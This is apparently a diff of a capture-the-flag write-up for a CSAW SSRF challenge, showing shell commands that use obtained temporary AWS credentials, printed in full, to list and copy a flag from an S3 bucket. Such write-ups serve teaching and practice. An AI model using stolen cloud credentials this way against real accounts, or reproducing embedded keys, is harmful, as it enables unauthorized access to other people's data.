@@ -84,9 +84,9 @@ Now, it's a cake-walk
 
 ```
 dcua@ubuntu:~/.aws$ export AWS_SESSION_TOKEN="FQoGZXIvYXdzEH8aDBRJgAqobBZNonIvaiK3AxU/YAzjrN2zoyIqHN/shiRZZiFGsK/gXDBoOuduCfhaa0NzF+USj3k8XgpC/SZ8D8cGt7mzWbTNRNhTLQxGb1SSJ0wTc2AedvcLpvnWBUquNi3CDm0G9pyZy2GUrUfVTBX4dqnPnKQAHwTh1vxtf/4wHW8T1l0DU8IMTYud8nyzZXmCgYyonLOGa+IW3Vu56nPce5e/iN9jVzV34BFNqJ71N5t8gkpd0t4jwV8fBtb+mRyCT7dNyFdl1jMSb8CtkU/OGzLW/n5qmWRMasEvhNHBWg8+CB5vt8XmJkvAFmkP91Iv3cmqfY7VWuXJ2VvHw3Z8K6uxkW6LV7xmiJRRwuUtrXVf/+KH+TzoNTi0V3sIKb/839MRDnfVd5V/Q7+q6TgSKyUa900EeEDizOTxQZIzRS1fQpjL1s3pwZ4ESqUCmYdLgBH96Swv8y7X9mWRKjPx0MXP4PLLrWrJHq54UqMVwtoun4GEezCJIiq7S5SoLMiIYbPnAqYubaWfvV2YPPnCJ1JUDQkwF42+UJxGGb65jKlz8k7P92w6wn0i2lnkcehGsO6omwkIWBFVSs2Niu1njwjIoU4okpOW3wU="
-dcua@ubuntu:~/.aws$ AWS_ACCESS_KEY_ID='ASIAS7BJMNVVYOPYAMR6' AWS_SECRET_ACCESS_KEY='r1gkApbLcHUFY6aWA5ZgKxgSUPWMqM8JVW98RoLc' aws s3 ls s3://csaw-ctf
+dcua@ubuntu:~/.aws$ AWS_ACCESS_KEY_ID='ASIAS7BJMNVVYOPYAMR6' AWS_SECRET_ACCESS_KEY='U/SHZlLN6OLQ3AVWgdh2pWZ7lV1FEjKS5nR/wgBC' aws s3 ls s3://csaw-ctf
 2018-11-02 12:52:38         36 flag
-dcua@ubuntu:~/.aws$ AWS_ACCESS_KEY_ID='ASIAS7BJMNVVYOPYAMR6' AWS_SECRET_ACCESS_KEY='r1gkApbLcHUFY6aWA5ZgKxgSUPWMqM8JVW98RoLc' aws s3 cp s3://csaw-ctf/flag ./flag
+dcua@ubuntu:~/.aws$ AWS_ACCESS_KEY_ID='ASIAS7BJMNVVYOPYAMR6' AWS_SECRET_ACCESS_KEY='U/SHZlLN6OLQ3AVWgdh2pWZ7lV1FEjKS5nR/wgBC' aws s3 cp s3://csaw-ctf/flag ./flag
 download: s3://csaw-ctf/flag to ./flag              
 dcua@ubuntu:~/.aws$ cat flag 
 flag{SsRF_1s-c0oL_Ag4iN-w1th_cl0uDs}
